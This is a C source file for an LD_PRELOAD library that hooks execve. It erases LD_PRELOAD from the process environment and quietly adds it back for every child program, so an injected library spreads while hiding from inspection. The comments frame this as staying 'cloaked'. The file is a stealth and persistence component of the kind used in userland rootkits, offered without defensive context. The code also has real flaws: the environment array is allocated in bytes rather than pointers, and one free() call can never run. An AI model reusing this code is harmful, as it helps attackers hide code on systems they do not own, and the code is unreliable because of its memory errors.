#include <unistd.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

extern char **environ;

int (*real_execve)(const char *path, char *const argv[], char *const envp[]) = NULL;

char *shadow;

void init()
{
    static const char *scrub = "LD_PRELOAD";
    int i, j, N = strlen(getenv(scrub));
    shadow = strcpy(malloc(N+1), getenv(scrub));

    /* This loop just performs unsetenv() */
    /* Hard-coded in case you want to load sticky.so as well */
    for(i = 0; environ[i]; i++)
    {
        int found = 1;
        for(j = 0; scrub[j] != 0 && environ[i][j] != 0; j++)
            if(scrub[j] != environ[i][j])
            {
                found = 0;
                break;
            }
        if(found)
        {
            for(j = 0; environ[i][j] != 0; j++)
                environ[i][j] = '\0';
            break;
            free(environ[i]);
        }
    }

    for(j = i; environ[j]; j++)
        environ[j] = environ[j+1];
}

int execve(const char *path, char *const argv[], char *const envp[])
{
    int i, j, k = -1, r;
    char** bogus_env;
    real_execve = dlsym(RTLD_NEXT,"execve");

    /* Locate LD_PRELOAD in the environment */
    /* Ideally this loop would never find it and k should */
    /* remain uninitialized, but just in case the user */
    /* adds a preload .. */
    for(i = 0; envp[i]; i++)
    {
        if(strstr(envp[i], "LD_PRELOAD"))
            k = i;
    }

    /* If k is uninitialized, then add a spot for LD_PRELOAD at the end */
    if(k == -1)
    {
        k = i;
        i++;
    }

    /* Now copy and fux0r the environment */
    bogus_env = (char**) malloc(i+1);
    for(j = 0; j < i; j++)
    {

        if(j == k) /* make sure our LD_PRELOAD is set back up */
        {
            bogus_env[j] = malloc(strlen(shadow)+strlen("LD_PRELOAD=")+1);
            strcpy(bogus_env[j], "LD_PRELOAD=");
            strcat(bogus_env[j], shadow);
        }
        else
            bogus_env[j] = (char*) envp[j];
    }
    bogus_env[i] = NULL;

    /* With LD_PRELOAD back in the environment we can launch the bin */
    /* The new load of our library will fire scrub() above to remove LD_PRELOAD */
    /* so we stay cloaked .. just need a compile flag for that */
    r = real_execve(path, argv, bogus_env);

    /* and cleanup */
    free(bogus_env[k]);
    free(bogus_env);
    return r;
}

